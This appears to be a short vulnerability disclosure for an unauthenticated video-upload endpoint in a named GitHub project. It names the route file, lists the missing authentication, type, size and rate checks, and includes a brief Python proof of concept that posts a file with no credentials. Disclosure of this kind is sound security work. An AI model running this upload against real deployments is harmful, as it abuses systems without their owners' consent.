# Security Vulnerability: Unauthenticated File Upload in [rabbit](https://github.com/abhishekprajapatt/rabbit)

## Vulnerable Endpoint
`POST https://localhost/api/v1/media/upload-video`

## Source Code Issue
**File:** `backend/routes/media.route.js` from https://github.com/abhishekprajapatt/rabbit


## POC 
```python
import requests
import os
from pathlib import Path

url = "https://localhost.com/api/v1/media/upload-video"
file_path = "C:/1.jpg"

with open(file_path, 'rb') as f:
    files = {'file': (os.path.basename(file_path), f)}
    response = requests.post(url, files=files)

print(response.status_code)
print(response.json())
```

<img width="1233" height="105" alt="image" src="https://github.com/user-attachments/assets/4999eb97-8b0d-425e-be29-2c2b866c27da" />

## Problems 
❌ No authentication middleware

❌ No file type validation

❌ No file size limits

❌ No rate limiting

